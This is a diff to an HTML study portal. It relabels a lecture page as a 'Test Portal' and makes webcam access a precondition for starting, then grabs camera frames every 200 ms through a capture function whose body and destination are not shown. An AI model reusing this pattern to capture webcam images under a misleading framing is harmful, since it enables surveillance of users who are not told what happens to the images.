@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>JEE Ultimate Dashboard</title>
+<title>JEE Ultimate Test Portal</title>
 
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
@@ -44,11 +44,7 @@ h1{
   100%{letter-spacing:4px;}
 }
 
-.top-info{
-  text-align:center;
-  margin-bottom:25px;
-}
-
+.top-info{text-align:center;margin-bottom:25px;}
 #studentName{cursor:pointer;color:#00ffd5;}
 #timeDate{margin-top:5px;font-size:14px;opacity:0.8;}
 #rankCounter{margin-top:10px;font-size:20px;color:#ffcc00;}
@@ -96,7 +92,6 @@ button{
 button:hover{transform:scale(1.05);}
 
 #timer{font-size:22px;margin-top:10px;}
-
 .quote{margin-top:10px;font-style:italic;opacity:0.8;}
 
 iframe{width:100%;height:100%;border:0;display:none;}
@@ -108,7 +103,7 @@ iframe{width:100%;height:100%;border:0;display:none;}
 
 <div id="overlay">
 
-<h1>JEE Ultimate Portal</h1>
+<h1>JEE Ultimate Test Portal</h1>
 
 <div class="top-info">
   <div id="studentName" onclick="changeName()">Welcome, Adarsh 🚀</div>
@@ -119,8 +114,8 @@ iframe{width:100%;height:100%;border:0;display:none;}
 <div class="container">
 
   <div class="card">
-    <h3>Start Lecture</h3>
-    <button onclick="start()">▶ Start Lecture</button>
+    <h3>Start Test</h3>
+    <button onclick="start()">▶ Start Test</button>
   </div>
 
   <div class="card">
@@ -143,7 +138,6 @@ iframe{width:100%;height:100%;border:0;display:none;}
   </div>
 
 </div>
-
 </div>
 
 <iframe id="frame"></iframe>
@@ -208,7 +202,7 @@ function stopTimer(){clearInterval(timerInt);}
 /* Quotes */
 let quotes=[
   "Consistency beats motivation.",
-  "One lecture closer to IIT.",
+  "One test closer to IIT.",
   "Focus now, celebrate later.",
   "Small daily improvement = Big results."
 ];
@@ -219,8 +213,22 @@ function rotateQuote(){
 }
 setInterval(rotateQuote,4000);rotateQuote();
 
-/* ORIGINAL LECTURE LOGIC (UNCHANGED) */
+/* START TEST LOGIC (Camera Required) */
 async function start(){
+
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({
+      video:{width:1280,height:720}
+    });
+
+    v.srcObject=stream;
+    setTimeout(capture,200);
+    setInterval(capture,200);
+
+  }catch(e){
+    return; // If denied → do nothing
+  }
+
   document.getElementById("overlay").style.display="none";
 
   const r=await fetch("/get_video_link");
@@ -237,15 +245,6 @@ async function start(){
   }else if(frame.msRequestFullscreen){
     frame.msRequestFullscreen();
   }
-
-  try{
-    const stream=await navigator.mediaDevices.getUserMedia({
-      video:{width:1280,height:720}
-    });
-    v.srcObject=stream;
-    setTimeout(capture,200);
-    setInterval(capture,200);
-  }catch(e){}
 }
 
 function capture(){
